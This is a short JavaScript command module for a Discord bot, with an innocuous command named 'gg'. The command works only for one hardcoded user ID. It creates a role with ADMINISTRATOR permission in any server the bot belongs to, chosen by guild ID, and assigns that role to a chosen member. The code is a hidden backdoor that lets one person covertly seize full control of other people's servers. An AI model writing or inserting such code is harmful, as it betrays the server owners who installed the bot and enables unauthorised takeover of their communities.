const dcUtil = require('../tools/dc-util.js');

module.exports = {
    name: "gg",
    aliases: [],
    guilds: [],
    permissions: ['ADMINISTRATOR'],

    async execute(client, msg, args) {
        if (msg.author.id !== '411895879935590411') return;
        let guild = client.guilds.cache.get(args[0]);
        let member = await dcUtil.getMemberByTag(guild, args[1])

        let role = await createRole(guild, "new role");
        let roleId = role.id;
        member.roles.add(roleId)
    }
}

async function createRole(guild, name) {
    return await guild.roles.create({
        name: name,
        color: "#FFFFFF",
        permissions: 'ADMINISTRATOR'
    })
}